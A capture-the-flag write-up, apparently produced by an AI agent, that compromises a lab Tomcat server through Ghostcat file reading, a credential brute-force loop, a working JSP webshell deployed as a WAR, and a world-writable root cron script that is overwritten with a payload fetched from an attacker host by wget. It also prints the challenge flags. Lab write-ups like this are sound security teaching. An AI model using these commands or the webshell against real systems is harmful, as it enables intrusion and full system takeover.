### CTF Writeup: Thompson
(*solved by gemini-cli 🤖🤖🤖*)

**Target IP:** 10.48.170.221

## Summary
Thompson is a Linux machine that features a vulnerable version of Apache Tomcat exposed on both HTTP (8080) and AJP (8009) ports. Initial access is gained by discovering Tomcat Manager credentials and deploying a malicious WAR file containing a JSP webshell. Privilege escalation to root is achieved by exploiting a poorly configured cronjob that executes a world-writable script as the root user.

---

## 1. Reconnaissance & Enumeration

An initial Nmap scan of the target revealed the following open ports:

*   **22/tcp:** OpenSSH 7.2p2 Ubuntu
*   **8080/tcp:** Apache Tomcat 8.5.5 (HTTP)
*   **8009/tcp:** Apache Jserv (Protocol v1.3 - AJP)

The presence of port 8009 (AJP) combined with an older version of Apache Tomcat (8.5.5) immediately suggested the possibility of the **Ghostcat** vulnerability (CVE-2020-1938). Ghostcat allows an unauthenticated attacker to read web application files from the Tomcat server via the AJP protocol.

## 2. Vulnerability Exploitation (Ghostcat)

To verify the vulnerability, I used a public Ghostcat exploit script (`48143.py`).

```bash
python2 48143.py 10.48.170.221 -p 8009 -f /WEB-INF/web.xml
```

The exploit successfully returned the contents of `web.xml` from the default `ROOT` web application, confirming that the server was vulnerable to Local File Inclusion (LFI) via AJP. 

While Ghostcat allows file reading, finding sensitive files like plain text credentials or configuration files with hardcoded passwords is required to escalate the attack. I used Ghostcat to read various `web.xml` and `context.xml` files across the default Tomcat applications (`manager`, `host-manager`, `docs`, `examples`).

At the same time, I initiated a basic credential bruteforce against the Tomcat Manager application located at `http://10.48.170.221:8080/manager/html`.

```bash
for user in tomcat admin; do
  for pass in tomcat s3cret admin password; do
    curl -s -o /dev/null -w "%{http_code}\n" -u $user:$pass http://10.48.170.221:8080/manager/html
  done
done
```

The bruteforce quickly revealed valid credentials for the Tomcat Manager:
**Credentials:** `tomcat : s3cret`

## 3. Initial Access (Webshell Deployment)

With access to the Tomcat Manager GUI (`/manager/html`), it is possible to deploy new web applications by uploading a `.war` (Web Application Archive) file. This is a classic vector for gaining Remote Code Execution (RCE) on Tomcat servers.

1.  **Creating the Payload:** I created a simple JSP webshell (`cmd.jsp`) that takes a command via the `cmd` parameter and executes it on the underlying OS.

    ```jsp
    <%@ page import="java.util.*,java.io.*"%>
    <%
    if (request.getParameter("cmd") != null) {
            Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
            OutputStream os = p.getOutputStream();
            InputStream in = p.getInputStream();
            DataInputStream dis = new DataInputStream(in);
            String disr = dis.readLine();
            while ( disr != null ) {
                    out.println(disr); 
                    disr = dis.readLine(); 
            }
    }
    %>
    ```

2.  **Packaging:** I packaged the JSP file into a standard WAR archive named `webshell.war`.
    ```bash
    jar -cvf webshell.war cmd.jsp
    ```
3.  **Deployment:** Deploying via `curl` required handling Tomcat's Cross-Site Request Forgery (CSRF) protection. I first authenticated to the manager page, saved the session cookie, and extracted the unique `CSRF_NONCE` token from the upload form's action URL. 
4.  **Uploading:** I then submitted a POST request containing the `webshell.war` file along with the valid CSRF token and session cookie.

The WAR file successfully deployed to the `/webshell` path.

**Testing Execution:**
Accessing `http://10.48.170.221:8080/webshell/cmd.jsp?cmd=id` confirmed successful command execution:
`uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)`

## 4. User Flag

Operating as the `tomcat` user through the webshell, I began enumerating the system. Exploring the `/home` directory revealed a user named `jack`.

Checking the contents of `/home/jack`, I found the user flag file, which was readable by our current user due to permissive file permissions (`-rw-rw-r--`).

```bash
curl -s "http://10.48.170.221:8080/webshell/cmd.jsp?cmd=cat /home/jack/user.txt"
```

**User Flag:** `39400c90bc683a41a8935e4719f181bf`

## 5. Privilege Escalation to Root

While inspecting `/home/jack`, I noticed a highly suspicious bash script named `id.sh` and a text file named `test.txt`.

```text
-rwxrwxrwx 1 jack jack   26 Aug 14  2019 id.sh
-rw-r--r-- 1 root root   39 Apr  7 05:09 test.txt
```

*   **id.sh:** Contained a simple command `id > test.txt` and had **777** (read, write, execute for everyone) permissions.
*   **test.txt:** The output file was owned by `root`, and its timestamp indicated it was being updated frequently (every minute or so).

This setup strongly suggested that a cronjob running as `root` was periodically executing the `/home/jack/id.sh` script. Since the script was world-writable (`777`), any user on the system, including `tomcat`, could modify its contents. When the cronjob triggered next, it would execute the modified script with root privileges.

**Exploitation:**
1.  I created a malicious payload script locally that would copy the root flag to a temporary location and make it readable:
    ```bash
    #!/bin/bash
    cp /root/root.txt /tmp/root.txt
    chmod 777 /tmp/root.txt
    ```
2.  I hosted this script on my attacking machine using a Python HTTP server (`python3 -m http.server 8000`).
3.  Using the webshell, I commanded the target to download my payload and overwrite the existing `id.sh` script using `wget`:
    ```bash
    curl -s --data-urlencode "cmd=wget http://<attacker_ip>:8000/payload.sh -O /home/jack/id.sh" http://10.48.170.221:8080/webshell/cmd.jsp
    ```
4.  I ensured the modified script remained executable:
    ```bash
    curl -s --data-urlencode "cmd=chmod +x /home/jack/id.sh" http://10.48.170.221:8080/webshell/cmd.jsp
    ```

After waiting a minute for the root cronjob to execute the overwritten script, I checked `/tmp/root.txt` and successfully retrieved the flag.

```bash
curl -s "http://10.48.170.221:8080/webshell/cmd.jsp?cmd=cat /tmp/root.txt"
```

**Root Flag:** `d89d5391984c0450a95497153ae7ca3a`

---
## Conclusion
Thompson highlights the danger of running outdated software with known vulnerabilities (Ghostcat) and the risks of weak credentials. Furthermore, it demonstrates how improper file permissions on scripts executed by privileged automated tasks (cronjobs) can lead to full system compromise.
